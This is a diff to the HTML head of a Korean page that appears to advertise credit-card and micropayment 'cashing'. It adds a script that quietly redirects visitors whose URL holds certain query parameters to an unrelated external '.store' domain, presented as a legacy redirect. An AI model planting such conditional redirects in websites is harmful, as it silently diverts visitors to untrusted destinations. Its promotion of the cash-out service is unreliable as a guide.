@@ -14,6 +14,15 @@
     <meta name="revisit-after" content="1 days">
     
     <!-- Open Graph / Facebook -->
+        <script>
+            // Client-side redirect for legacy query-based board URLs to external board domain
+            (function(){
+                var q = window.location.search || '';
+                if (q.indexOf('q=') !== -1 || q.indexOf('bmode=') !== -1 || q.indexOf('idx=') !== -1) {
+                    window.location.replace('https://xn--90-vc7iv9i5p0bdii.store/');
+                }
+            })();
+        </script>
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://cardcashing.shop/">
     <meta property="og:title" content="신용카드현금화 85% 휴대폰소액결제 75% | 오렌지Pay">
